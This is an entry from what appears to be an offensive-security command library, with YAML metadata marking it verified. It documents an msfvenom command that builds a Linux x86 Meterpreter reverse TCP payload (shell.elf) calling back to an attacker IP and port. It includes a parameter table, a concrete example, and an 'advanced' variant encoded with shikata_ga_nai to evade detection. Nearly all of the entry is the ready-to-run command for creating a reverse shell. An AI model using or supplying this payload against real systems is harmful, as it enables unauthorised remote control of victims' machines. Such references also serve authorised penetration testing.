---
id: bcf7b0dd-a0af-4e60-a43c-fa39230846a5
name: generate-linux-meterpreter-payload
type: command
executor: bash
data: >-
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="$_LHOST" LPORT=$_LPORT -f
  elf > shell.elf
output: null
created_at: '2023-04-06T03:56:24.923327+00:00'
updated_at: '2023-04-10T20:25:33.111197+00:00'
platforms:
  - Linux
tags:
  - meterpreter
  - reverse-shell
  - elf
verified: true
validated: true
---

# Generate Linux Meterpreter Payload

## Command

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="$_LHOST" LPORT=$_LPORT -f elf > shell.elf
```

## Description

Creates an ELF Meterpreter reverse TCP payload for 32-bit Linux systems.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_LHOST | Attacker IP | Yes |
| $_LPORT | Attacker port | Yes |
| -p linux/x86/meterpreter/reverse_tcp | Linux Meterpreter payload | Built-in |
| -f elf | ELF binary format | Built-in |
| > shell.elf | Save to shell.elf | Built-in |

## Examples

### Basic Usage

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="192.168.1.100" LPORT=4444 -f elf > shell.elf
```

### Advanced Usage

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="192.168.1.100" LPORT=4444 -f elf -e x86/shikata_ga_nai > shell.elf
```

## Expected Output

Binary shell.elf (~3 KB); executable on Linux.

## Related

- [[commands/generate-windows-meterpreter-payload]]
- [[procedures/generate-multi-platform-reverse-shell-payloads]]
